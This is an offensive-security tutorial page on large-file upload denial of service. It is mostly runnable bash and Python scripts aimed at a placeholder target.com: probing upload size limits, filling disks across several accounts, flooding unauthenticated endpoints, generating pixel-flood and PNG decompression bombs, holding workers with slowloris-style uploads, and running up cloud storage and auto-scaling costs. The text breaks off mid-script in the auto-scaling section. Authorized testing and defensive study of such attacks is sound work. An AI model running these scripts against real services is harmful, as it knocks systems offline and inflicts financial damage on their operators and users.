---
title: Large File DoS Via Upload
description: Large File DoS Via Upload — Exhaust Server Resources Through Oversized File Uploads
navigation:
  icon: i-lucide-hard-drive
  title: Large File DoS Via Upload
---

## Large File DoS Via Upload

::badge
**Medium to High Severity — CWE-400 / CWE-770 / CWE-789**
::

Large File Denial of Service exploits the gap between what an application **advertises** as its upload limit and what the server **actually enforces** at every layer of the stack. A client-side JavaScript check limiting uploads to 5MB means nothing when the server's `php.ini` allows 2GB, the reverse proxy has no limit, and the cloud storage has infinite capacity billed to the target. The attacker sends files orders of magnitude larger than intended, consuming disk space, memory, bandwidth, processing time, and cloud budget until the application degrades or dies.

::note
This attack is not about sending a single massive file. It's about systematically probing and exploiting **every resource limit in the upload pipeline** — client-side validation, web server body limits, application framework limits, runtime memory, temp disk space, processing time, storage quotas, CDN bandwidth, database blob storage, and cloud billing thresholds. Each layer may have different limits, and the weakest link determines the attack surface.
::

The impact ranges from temporary slowdown (medium severity) to complete service unavailability and financial damage through cloud cost attacks (high severity). In shared hosting environments, a single oversized upload can crash the server and affect every tenant. In cloud environments, auto-scaling triggered by the attack can generate thousands of dollars in unexpected charges.

---

## Understanding the Attack Surface

### Resource Exhaustion Points

Every file upload traverses multiple components, each with its own resource constraints. Exhausting **any single point** can cause denial of service.

::accordion
  :::accordion-item{icon="i-lucide-layers" label="The Upload Resource Pipeline"}
  ```text
  CLIENT                    NETWORK                   SERVER
  ┌─────────┐              ┌─────────┐              ┌──────────────────────────────────┐
  │ Browser │ ──────────── │ Network │ ──────────── │ Reverse Proxy (Nginx/HAProxy)    │
  │ JS:5MB  │   Bandwidth  │ Transit │   Bandwidth  │ client_max_body_size: ???        │
  └─────────┘              └─────────┘              └──────────┬───────────────────────┘
                                                               │
                                                    ┌──────────▼───────────────────────┐
                                                    │ Web Server (Apache/IIS)          │
                                                    │ LimitRequestBody: ???            │
                                                    │ Temp disk write: /tmp            │
                                                    └──────────┬───────────────────────┘
                                                               │
                                                    ┌──────────▼───────────────────────┐
                                                    │ Application Runtime (PHP/Python)  │
                                                    │ upload_max_filesize: ???          │
                                                    │ post_max_size: ???                │
                                                    │ memory_limit: ???                 │
                                                    │ max_execution_time: ???           │
                                                    └──────────┬───────────────────────┘
                                                               │
                                                    ┌──────────▼───────────────────────┐
                                                    │ Application Code                  │
                                                    │ Size check: maybe/maybe not       │
                                                    │ Image processing: memory × dims   │
                                                    │ Virus scan: full file read         │
                                                    └──────────┬───────────────────────┘
                                                               │
                                                    ┌──────────▼───────────────────────┐
                                                    │ Storage Backend                   │
                                                    │ Disk: /var/www/uploads            │
                                                    │ S3: no size limit ($$$ per GB)    │
                                                    │ Database BLOB: table bloat        │
                                                    └──────────────────────────────────┘
  ```

  **Each layer has different limits — or no limit at all:**

  | Layer | Typical Config | Default Limit | Exploitable If |
  | ----- | -------------- | ------------- | -------------- |
  | **Client JS** | `if (file.size > 5MB) return false` | 5-10 MB | Using cURL (bypass JS entirely) |
  | **Nginx** | `client_max_body_size` | 1 MB (default!) | Set higher or unlimited for upload routes |
  | **Apache** | `LimitRequestBody` | Unlimited (0) | No explicit limit set |
  | **PHP** | `upload_max_filesize` | 2 MB default | Often increased to 50-500 MB |
  | **PHP** | `post_max_size` | 8 MB default | Must be > upload_max_filesize |
  | **PHP** | `memory_limit` | 128 MB | Processing large files in memory |
  | **PHP** | `max_execution_time` | 30s | Slow upload + processing |
  | **Django** | `DATA_UPLOAD_MAX_MEMORY_SIZE` | 2.5 MB | Often increased |
  | **Express** | `bodyParser limit` | 100 KB (JSON), unlimited (multipart) | No multipart limit set |
  | **Spring** | `spring.servlet.multipart.max-file-size` | 1 MB | Increased for file uploads |
  | **IIS** | `maxRequestLength` | 4 MB | Increased in web.config |
  | **Cloud WAF** | Varies | 100 MB typical | WAF may not inspect large bodies |
  | **Disk temp** | `/tmp` partition | Varies | Shared /tmp fills up |
  | **S3/Blob** | No limit | Unlimited | Every byte costs money |
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Impact Categories"}
  | Impact | Mechanism | Severity |
  | ------ | --------- | -------- |
  | **Disk exhaustion** | Uploads fill server disk → all services fail | High |
  | **Memory exhaustion** | Large file buffered in RAM → OOM kill | High |
  | **CPU exhaustion** | Image processing on huge file → 100% CPU | Medium-High |
  | **Bandwidth saturation** | Flood upload bandwidth → legitimate users can't connect | Medium |
  | **Temp space exhaustion** | PHP temp files fill /tmp → other apps crash | High |
  | **Database bloat** | BLOB storage fills database → queries slow → crash | High |
  | **Cloud cost attack** | S3/GCS storage + bandwidth → massive bill | Medium-High |
  | **Auto-scaling exploit** | Trigger scaling → many instances → multiplied cost | High |
  | **Worker exhaustion** | Long uploads tie up all worker processes → no capacity | High |
  | **Processing timeout** | Image resize on huge file → request timeout → retry loop | Medium |
  | **Cascading failure** | Disk full → logging fails → monitoring blind → undetected outage | High |
  | **Shared hosting impact** | One tenant's upload crashes shared server | High |
  :::
::

---

## Reconnaissance — Discovering Limits

### Probing Upload Size Boundaries

::tabs
  :::tabs-item{icon="i-lucide-ruler" label="Graduated Size Testing"}
  ```bash
  #!/bin/bash
  # Systematically probe upload size limits at every layer

  UPLOAD_URL="${1:-https://target.com/api/upload}"
  COOKIE="${2:-session=TOKEN}"
  FIELD="${3:-file}"

  echo "═══════════════════════════════════════════════"
  echo " Upload Size Limit Discovery"
  echo "═══════════════════════════════════════════════"
  echo "[*] Target: $UPLOAD_URL"
  echo ""

  # ── Phase 1: Find maximum accepted size ──
  echo "─── Phase 1: Maximum Upload Size ───"

  LAST_ACCEPTED=0
  LAST_REJECTED=0

  for size in 100K 500K 1M 2M 5M 10M 25M 50M 100M 200M 500M 1G 2G; do
      # Create test file of exact size
      dd if=/dev/zero of=/tmp/size_test.bin bs=1 count=0 seek=$size 2>/dev/null

      # Compress to reduce upload time (if server decompresses)
      ACTUAL_SIZE=$(stat -f%z /tmp/size_test.bin 2>/dev/null || stat -c%s /tmp/size_test.bin 2>/dev/null)

      START=$(date +%s%N)
      STATUS=$(curl -s -o /tmp/size_resp.txt -w "%{http_code}" --max-time 120 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/size_test.bin;filename=test_${size}.bin;type=application/octet-stream" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      END=$(date +%s%N)
      ELAPSED=$(( (END - START) / 1000000 ))

      RESP_BODY=$(cat /tmp/size_resp.txt 2>/dev/null)

      case $STATUS in
          200|201)
              LAST_ACCEPTED=$size
              echo "  [✓] ${size}: ACCEPTED (${ELAPSED}ms)"
              ;;
          413)
              LAST_REJECTED=$size
              echo "  [✗] ${size}: 413 Request Entity Too Large"
              echo "      → Server limit reached between ${LAST_ACCEPTED} and ${size}"
              break
              ;;
          408|504)
              echo "  [!] ${size}: TIMEOUT (${STATUS})"
              echo "      → Upload too slow or processing timeout"
              break
              ;;
          000)
              echo "  [!] ${size}: CONNECTION RESET/TIMEOUT"
              echo "      → Network or reverse proxy limit reached"
              break
              ;;
          500|502|503)
              echo "  [!] ${size}: SERVER ERROR (${STATUS})"
              echo "      → Server crashed processing this size"
              echo "      → Potential DoS impact confirmed"
              break
              ;;
          *)
              echo "  [?] ${size}: ${STATUS}"
              ;;
      esac
  done

  echo ""
  echo "[*] Maximum accepted size: ${LAST_ACCEPTED:-unknown}"
  echo "[*] First rejected size: ${LAST_REJECTED:-none (all accepted!)}"

  if [ "$LAST_REJECTED" = "0" ]; then
      echo "[!!!] NO SIZE LIMIT DETECTED — all sizes accepted!"
      echo "      This is a significant DoS vulnerability"
  fi

  rm -f /tmp/size_test.bin /tmp/size_resp.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-ruler" label="Client-Side vs Server-Side Limit Detection"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Client-Side vs Server-Side Size Limit ═══"

  # ── Step 1: Extract client-side limit from JavaScript ──
  echo "─── JavaScript Size Limit ───"

  PAGE_SOURCE=$(curl -s "https://target.com/upload" -H "Cookie: $COOKIE")

  # Search for size limits in JS
  echo "$PAGE_SOURCE" | grep -oiE "(max|maximum|limit)(Size|FileSize|Upload)\s*[:=]\s*[0-9]+" | head -5
  echo "$PAGE_SOURCE" | grep -oiE "file\.size\s*[<>]=?\s*[0-9]+" | head -5
  echo "$PAGE_SOURCE" | grep -oiE "maxFileSize\s*[:=]\s*[0-9]+" | head -5

  # Check HTML form attributes
  echo "$PAGE_SOURCE" | grep -oiE 'MAX_FILE_SIZE[^"]*"[^"]*"' | head -3
  echo "$PAGE_SOURCE" | grep -oiE 'data-max-size="[^"]*"' | head -3

  # ── Step 2: Compare client vs server limits ──
  echo ""
  echo "─── Server-Side Limit Test (bypass JS) ───"

  # Client limit is often 5-10 MB
  # Test server directly with cURL (bypasses all JS)
  for size_mb in 5 10 20 50 100 200 500; do
      dd if=/dev/zero of=/tmp/limit_test.bin bs=1M count=$size_mb 2>/dev/null

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 60 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/limit_test.bin;filename=test.jpg;type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      echo "  ${size_mb} MB: [${STATUS}]"

      if [ "$STATUS" = "413" ] || [ "$STATUS" = "000" ]; then
          echo "  → Server limit: ~${size_mb} MB"
          break
      fi

      if [ "$STATUS" = "200" ] && [ "$size_mb" -ge 50 ]; then
          echo "  [!] Server accepts ${size_mb} MB despite client-side restriction"
          echo "      → Client-side-only size limit — bypassable"
      fi
  done

  rm -f /tmp/limit_test.bin
  ```
  :::

  :::tabs-item{icon="i-lucide-ruler" label="Multi-Layer Limit Probing"}
  ```bash
  TARGET="https://target.com"
  COOKIE="session=TOKEN"

  echo "═══ Multi-Layer Upload Limit Analysis ═══"

  # ── Layer 1: Reverse Proxy (Nginx/HAProxy) ──
  echo "─── Reverse Proxy Detection ───"
  HEADERS=$(curl -sI "$TARGET")
  echo "$HEADERS" | grep -iE "server:|x-powered-by|via:|x-proxy|x-cache"

  # Nginx client_max_body_size manifests as 413 with specific error
  dd if=/dev/zero bs=1M count=2 2>/dev/null > /tmp/proxy_test.bin
  RESP=$(curl -s -D /tmp/proxy_headers.txt -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/proxy_test.bin" -H "Cookie: $COOKIE" 2>/dev/null)
  grep "413" /tmp/proxy_headers.txt 2>/dev/null && echo "[*] Nginx 413 at 2MB — client_max_body_size likely 1M"

  # ── Layer 2: Application Framework ──
  echo ""
  echo "─── Application Framework Limits ───"

  # Try to read PHP config via upload error messages
  dd if=/dev/zero bs=1M count=200 2>/dev/null > /tmp/fw_test.bin
  RESP=$(curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/fw_test.bin;filename=big.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)

  echo "$RESP" | grep -ioE "upload_max_filesize|post_max_size|max_upload|maximum.*size|file.*too.*large|exceeds.*maximum|limit.*exceeded" | head -5
  echo "$RESP" | grep -ioE "[0-9]+[MmGgKk][Bb]?" | head -5

  # ── Layer 3: Storage Backend ──
  echo ""
  echo "─── Storage Analysis ───"

  # Check if uploads go to local disk or cloud
  UPLOAD_RESP=$(curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/proxy_test.bin;filename=storage_test.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)

  echo "$UPLOAD_RESP" | grep -oiE "s3\.amazonaws|blob\.core\.windows|storage\.googleapis|cloudinary|imgix|cloudfront"
  echo "$UPLOAD_RESP" | grep -oP '"(url|path)"\s*:\s*"([^"]*)"' | head -3

  # If S3/GCS/Azure → potential cloud cost attack
  if echo "$UPLOAD_RESP" | grep -qi "s3\|blob\|storage\.googleapis"; then
      echo "[!] Cloud storage detected — unlimited storage but costs money per GB"
      echo "    Repeated large uploads = financial denial of service"
  fi

  rm -f /tmp/proxy_test.bin /tmp/fw_test.bin /tmp/proxy_headers.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-ruler" label="Upload Count & Rate Limits"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Upload Count & Rate Limit Detection ═══"

  # Create small test file
  dd if=/dev/zero bs=1K count=100 2>/dev/null > /tmp/rate_test.bin

  # ── Test: How many uploads per minute? ──
  echo "─── Uploads Per Minute ───"
  COUNT=0
  START=$(date +%s)

  for i in $(seq 1 200); do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/rate_test.bin;filename=test_${i}.jpg;type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      if [ "$STATUS" = "429" ]; then
          echo "  [*] Rate limited after ${COUNT} uploads (429 Too Many Requests)"
          break
      elif [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
          COUNT=$((COUNT + 1))
      else
          echo "  [${STATUS}] at upload #${i}"
      fi

      ELAPSED=$(( $(date +%s) - START ))
      if [ "$ELAPSED" -ge 60 ]; then
          echo "  [*] ${COUNT} uploads in 60 seconds — no rate limit detected"
          break
      fi
  done

  if [ "$COUNT" -ge 100 ]; then
      echo "  [!!!] 100+ uploads in <60s with NO rate limiting"
      echo "        → Potential for rapid disk exhaustion"
  fi

  # ── Test: Total upload quota ──
  echo ""
  echo "─── Total Upload Quota ───"
  echo "[*] Upload same file many times — check if quota is enforced"

  QUOTA_COUNT=0
  for i in $(seq 1 50); do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/rate_test.bin;filename=quota_test_${i}.jpg;type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && QUOTA_COUNT=$((QUOTA_COUNT + 1))
      [ "$STATUS" = "507" ] && echo "  [*] Storage quota reached at upload #${i}" && break
      [ "$STATUS" = "413" ] && echo "  [*] Size/quota limit at upload #${i}" && break
  done
  echo "  [*] ${QUOTA_COUNT}/50 uploads accepted without quota enforcement"

  rm -f /tmp/rate_test.bin
  ```
  :::
::

---

## Exploitation Techniques

### Disk Exhaustion

::tabs
  :::tabs-item{icon="i-lucide-hard-drive" label="Rapid Disk Fill"}
  ```bash
  # ═══════════════════════════════════════════════
  # WARNING: Only perform this with explicit authorization
  # Start with small volumes and monitor server health
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Disk Exhaustion Test (Controlled) ═══"

  # ── Step 1: Create maximum-size accepted file ──
  # Use the size discovered in reconnaissance
  MAX_ACCEPTED_MB=50  # Replace with actual discovered limit

  dd if=/dev/zero of=/tmp/disk_fill.bin bs=1M count=$MAX_ACCEPTED_MB 2>/dev/null
  echo "[+] Created ${MAX_ACCEPTED_MB}MB test file"

  # ── Step 2: Upload in parallel to maximize disk consumption ──
  echo "[*] Uploading files in parallel (monitor server health!)"

  UPLOAD_COUNT=0
  MAX_UPLOADS=20  # Start small — increase if testing authorized

  # Sequential test first
  for i in $(seq 1 $MAX_UPLOADS); do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 120 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/disk_fill.bin;filename=large_${i}_$(date +%s).jpg;type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      UPLOAD_COUNT=$((UPLOAD_COUNT + 1))
      TOTAL_MB=$((UPLOAD_COUNT * MAX_ACCEPTED_MB))

      echo "  [${STATUS}] Upload #${i} — Total uploaded: ${TOTAL_MB}MB"

      # Check server health after each upload
      HEALTH=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/" --max-time 5 2>/dev/null)
      if [ "$HEALTH" = "500" ] || [ "$HEALTH" = "502" ] || [ "$HEALTH" = "503" ] || [ "$HEALTH" = "000" ]; then
          echo "  [!!!] SERVER DEGRADATION at ${TOTAL_MB}MB total!"
          echo "        Health check: ${HEALTH}"
          break
      fi

      [ "$STATUS" = "507" ] && echo "  [*] Storage full (507)" && break
      [ "$STATUS" = "413" ] && echo "  [*] Limit reached (413)" && break
  done

  echo ""
  echo "[*] Total uploaded: ${TOTAL_MB}MB in ${UPLOAD_COUNT} files"

  rm -f /tmp/disk_fill.bin
  ```
  :::

  :::tabs-item{icon="i-lucide-hard-drive" label="Multi-Account Disk Fill"}
  ```bash
  # ═══════════════════════════════════════════════
  # If per-user quotas exist, use multiple accounts
  # to bypass individual limits
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  FIELD="file"

  # Create test file
  dd if=/dev/zero bs=1M count=50 2>/dev/null > /tmp/multi_fill.bin

  echo "═══ Multi-Account Disk Fill ═══"

  # List of session cookies from different accounts
  SESSIONS=(
      "session=account1_token"
      "session=account2_token"
      "session=account3_token"
      "session=account4_token"
      "session=account5_token"
  )

  TOTAL_UPLOADED=0

  for session in "${SESSIONS[@]}"; do
      ACCOUNT=$(echo "$session" | grep -oP 'account[0-9]+')
      echo "─── Account: ${ACCOUNT:-unknown} ───"

      for i in $(seq 1 10); do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 120 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/multi_fill.bin;filename=${ACCOUNT}_${i}.jpg;type=image/jpeg" \
            -H "Cookie: $session" 2>/dev/null)

          [ "$STATUS" = "200" ] && TOTAL_UPLOADED=$((TOTAL_UPLOADED + 50))
          echo "  [${STATUS}] #${i} — Total: ${TOTAL_UPLOADED}MB"

          [ "$STATUS" != "200" ] && break
      done
  done

  echo ""
  echo "[*] Total across all accounts: ${TOTAL_UPLOADED}MB"

  rm -f /tmp/multi_fill.bin
  ```
  :::

  :::tabs-item{icon="i-lucide-hard-drive" label="No-Auth Upload Flood"}
  ```bash
  # ═══════════════════════════════════════════════
  # If upload endpoint doesn't require authentication,
  # unlimited uploads from unlimited "users"
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  FIELD="file"

  echo "═══ Unauthenticated Upload Flood Detection ═══"

  dd if=/dev/zero bs=1M count=10 2>/dev/null > /tmp/noauth_test.bin

  # Test without cookies/auth
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 30 \
    -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/noauth_test.bin;filename=test.jpg;type=image/jpeg" 2>/dev/null)

  if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
      echo "[!!!] Upload endpoint accepts UNAUTHENTICATED uploads!"
      echo "      Any anonymous user can fill server disk"
      echo ""
      echo "[*] Parallel flood test (5 concurrent uploads):"

      for i in $(seq 1 5); do
          curl -s -o /dev/null -w "[%{http_code}] Upload #${i}\n" --max-time 30 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/noauth_test.bin;filename=anon_${i}_$(date +%s).jpg;type=image/jpeg" &
      done
      wait
  else
      echo "[*] Upload requires authentication (${STATUS})"
  fi

  rm -f /tmp/noauth_test.bin
  ```
  :::
::

### Memory & CPU Exhaustion

::tabs
  :::tabs-item{icon="i-lucide-cpu" label="Image Processing Memory Bomb"}
  ```bash
  # ═══════════════════════════════════════════════
  # Upload images with extreme dimensions
  # When the server resizes them, memory consumption
  # is proportional to WIDTH × HEIGHT × CHANNELS
  # A 100000×100000 JPEG → ~30GB RAM when decoded
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Image Processing Memory Exhaustion ═══"

  # ── Level 1: Large dimensions, small file ──
  # Solid color image compresses very well
  python3 -c "
  from PIL import Image
  sizes = [
      (5000, 5000, 'level1_5k.jpg'),
      (10000, 10000, 'level2_10k.jpg'),
      (20000, 20000, 'level3_20k.jpg'),
      (50000, 50000, 'level4_50k.jpg'),
  ]
  for w, h, name in sizes:
      try:
          img = Image.new('RGB', (w, h), 'white')
          img.save(f'/tmp/{name}', 'JPEG', quality=10)
          import os
          file_size = os.path.getsize(f'/tmp/{name}')
          ram_needed = w * h * 3 / 1024 / 1024
          print(f'[+] {name}: {w}x{h} = {file_size//1024}KB on disk, ~{ram_needed:.0f}MB RAM when decoded')
      except Exception as e:
          print(f'[-] {name}: {e}')
  " 2>/dev/null

  # Upload each and measure server response
  for level in 1 2 3 4; do
      FILE="/tmp/level${level}_*.jpg"
      for f in $FILE; do
          [ -f "$f" ] || continue
          NAME=$(basename "$f")

          START=$(date +%s%N)
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 120 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@${f};filename=${NAME};type=image/jpeg" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          END=$(date +%s%N)
          ELAPSED=$(( (END - START) / 1000000 ))

          echo "  [${STATUS}] ${NAME}: ${ELAPSED}ms"

          if [ "$STATUS" = "500" ] || [ "$STATUS" = "502" ] || [ "$STATUS" = "503" ]; then
              echo "      [!!!] SERVER ERROR — processing likely OOM'd"
          fi
          if [ "$ELAPSED" -gt 30000 ]; then
              echo "      [!] Very slow processing — CPU exhaustion"
          fi
      done
  done

  rm -f /tmp/level*_*.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-cpu" label="Processing Time Bomb (Pixel Flood)"}
  ```python [pixel_flood_generator.py]
  #!/usr/bin/env python3
  """
  Generate images that consume extreme resources when processed.
  
  Strategy 1: High resolution, low file size (decompression bomb)
  Strategy 2: Complex color patterns (slow resize algorithms)
  Strategy 3: Many layers/channels (TIFF with many pages)
  """
  from PIL import Image
  import os
  import struct

  def create_pixel_flood(width, height, output, quality=5):
      """Tiny JPEG that expands to massive RAM when decoded"""
      try:
          img = Image.new('RGB', (width, height), 'white')
          img.save(output, 'JPEG', quality=quality)
          size = os.path.getsize(output)
          ram = width * height * 3 / 1024 / 1024
          print(f"[+] {output}: {width}x{height} | File: {size//1024}KB | RAM: {ram:.0f}MB")
      except Exception as e:
          print(f"[-] {output}: {e}")

  def create_png_bomb(width, height, output):
      """PNG with solid color — compresses to tiny file, huge when decoded"""
      try:
          img = Image.new('RGBA', (width, height), (255, 255, 255, 255))
          img.save(output, 'PNG', compress_level=9)
          size = os.path.getsize(output)
          ram = width * height * 4 / 1024 / 1024
          print(f"[+] {output}: {width}x{height} | File: {size//1024}KB | RAM: {ram:.0f}MB (RGBA)")
      except Exception as e:
          print(f"[-] {output}: {e}")

  def create_slow_resize_image(width, height, output):
      """Image with complex patterns that slow down resize algorithms"""
      try:
          img = Image.new('RGB', (width, height))
          pixels = img.load()
          for x in range(width):
              for y in range(height):
                  pixels[x, y] = (
                      (x * 7 + y * 13) % 256,
                      (x * 11 + y * 3) % 256,
                      (x * 5 + y * 17) % 256,
                  )
          img.save(output, 'JPEG', quality=95)
          print(f"[+] {output}: {width}x{height} complex pattern")
      except Exception as e:
          print(f"[-] {output}: {e}")

  os.makedirs('pixel_floods', exist_ok=True)

  # Graduated sizes
  print("═══ Pixel Flood Generators ═══")
  print("")
  print("─── JPEG Decompression Bombs ───")
  for w, h in [(5000, 5000), (10000, 10000), (20000, 20000), (30000, 30000)]:
      create_pixel_flood(w, h, f'pixel_floods/jpeg_{w}x{h}.jpg')

  print("")
  print("─── PNG Decompression Bombs ───")
  for w, h in [(5000, 5000), (10000, 10000), (15000, 15000)]:
      create_png_bomb(w, h, f'pixel_floods/png_{w}x{h}.png')

  print("")
  print("─── Slow Resize Images ───")
  create_slow_resize_image(5000, 5000, 'pixel_floods/complex_5k.jpg')
  ```
  :::

  :::tabs-item{icon="i-lucide-cpu" label="Worker/Connection Exhaustion"}
  ```bash
  # ═══════════════════════════════════════════════
  # Slowloris-style attack via upload
  # Open many connections, send data very slowly
  # Each connection ties up a server worker
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  echo "═══ Upload Connection Exhaustion ═══"

  # ── Method 1: Slow upload (trickle data) ──
  echo "[*] Testing slow upload tolerance..."

  # Send upload at 1KB/s (extremely slow)
  dd if=/dev/zero bs=1M count=10 2>/dev/null > /tmp/slow_upload.bin

  START=$(date +%s)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 600 \
    --limit-rate 1k \
    -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/slow_upload.bin;filename=slow.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  END=$(date +%s)
  ELAPSED=$((END - START))

  echo "  Status: ${STATUS} | Time: ${ELAPSED}s"
  if [ "$ELAPSED" -gt 60 ]; then
      echo "  [!] Server held connection for ${ELAPSED}s at 1KB/s"
      echo "      Opening many such connections would exhaust workers"
  fi

  # ── Method 2: Parallel slow uploads ──
  echo ""
  echo "[*] Testing parallel slow uploads..."

  PARALLEL_COUNT=10
  for i in $(seq 1 $PARALLEL_COUNT); do
      curl -s -o /dev/null --max-time 300 --limit-rate 1k \
        -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/slow_upload.bin;filename=slow_${i}.jpg;type=image/jpeg" \
        -H "Cookie: $COOKIE" &
  done

  echo "  [*] ${PARALLEL_COUNT} slow uploads running..."
  sleep 5

  # Check if server is still responsive
  HEALTH=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/" --max-time 5 2>/dev/null)
  echo "  [*] Server health: ${HEALTH}"
  if [ "$HEALTH" != "200" ]; then
      echo "  [!!!] Server degraded during parallel slow uploads!"
  fi

  # Kill background jobs
  kill %{1..10} 2>/dev/null
  wait 2>/dev/null

  rm -f /tmp/slow_upload.bin
  ```
  :::
::

### Cloud Cost Attacks

::tabs
  :::tabs-item{icon="i-lucide-cloud" label="S3/Cloud Storage Cost Attack"}
  ```bash
  # ═══════════════════════════════════════════════
  # If uploads go to S3/GCS/Azure Blob:
  # - Storage costs: ~$0.023/GB/month (S3 Standard)
  # - PUT request costs: ~$0.005 per 1000 requests
  # - Transfer costs: $0.09/GB outbound
  # 
  # 1000 uploads × 100MB = 100GB = ~$2.30/month storage
  # + $5 PUT requests + $9 if downloaded = ~$16/month
  # Scaled up: 100,000 uploads = $1,600/month
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Cloud Storage Cost Analysis ═══"

  # ── Detect cloud storage ──
  RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/dev/null;filename=probe.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)

  if echo "$RESP" | grep -qi "s3\.amazonaws\|s3-.*\.amazonaws"; then
      PROVIDER="AWS S3"
      COST_PER_GB_MONTH="0.023"
  elif echo "$RESP" | grep -qi "storage\.googleapis"; then
      PROVIDER="Google Cloud Storage"
      COST_PER_GB_MONTH="0.020"
  elif echo "$RESP" | grep -qi "blob\.core\.windows"; then
      PROVIDER="Azure Blob Storage"
      COST_PER_GB_MONTH="0.018"
  elif echo "$RESP" | grep -qi "cloudinary\|imgix\|uploadcare"; then
      PROVIDER="Image CDN service"
      COST_PER_GB_MONTH="varies (often more expensive)"
  else
      PROVIDER="Unknown (may be local disk)"
      COST_PER_GB_MONTH="0"
  fi

  echo "[*] Storage provider: ${PROVIDER}"
  echo ""

  # ── Calculate potential cost impact ──
  echo "─── Cost Projection ───"

  # Test max file size
  dd if=/dev/zero bs=1M count=100 2>/dev/null > /tmp/cost_test.bin
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 60 \
    -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/cost_test.bin;filename=large.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)

  if [ "$STATUS" = "200" ]; then
      echo "[+] 100MB upload accepted"
      echo ""
      echo "  Cost projection (${PROVIDER}):"
      echo "    100 uploads × 100MB = 10GB    → ~\$0.23/month storage"
      echo "    1,000 uploads = 100GB          → ~\$2.30/month"
      echo "    10,000 uploads = 1TB           → ~\$23/month"
      echo "    100,000 uploads = 10TB         → ~\$230/month"
      echo "    + Transfer costs if downloaded  → 2-3x storage cost"
      echo "    + PUT request costs             → additional overhead"
      echo ""
      echo "  Automated 24/7 upload:"
      echo "    1 upload/second × 100MB × 86400s = 8.6TB/day"
      echo "    Monthly: ~258TB → ~\$5,900/month (storage alone)"
  fi

  rm -f /tmp/cost_test.bin
  ```
  :::

  :::tabs-item{icon="i-lucide-cloud" label="Auto-Scaling Exploit"}
  ```bash
  # ═══════════════════════════════════════════════
  # If the application auto-scales based on load:
  # Trigger scaling → more instances → more cost
  # Each instance processes uploads → more resource consumption
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  echo "═══ Auto-Scaling Trigger Test ═══"

  # Create CPU-intensive upload (image that requires heavy processing)
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (10000, 10000))
  pixels = img.load()
  for x in range(10000):
      for y in range(10000):
          pixels[x,y] = ((x*7)%256, (y*13)%256, ((x+y)*3)%256)
  img.save('/tmp/heavy.jpg', 'JPEG', quality=95)
  " 2>/dev/null

  echo "[*] Sending parallel CPU-intensive uploads..."

  # Send multiple heavy uploads simultaneously
  for i in $(seq 1 20); do
      curl -s -o /dev/null --max-time 120 \
        -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/heavy.jpg;filename=heavy_${i}.jpg;type=image/jpeg" \
        -H "Cookie: $COOKIE" &
  done

  echo "[*] 20 parallel heavy uploads sent"
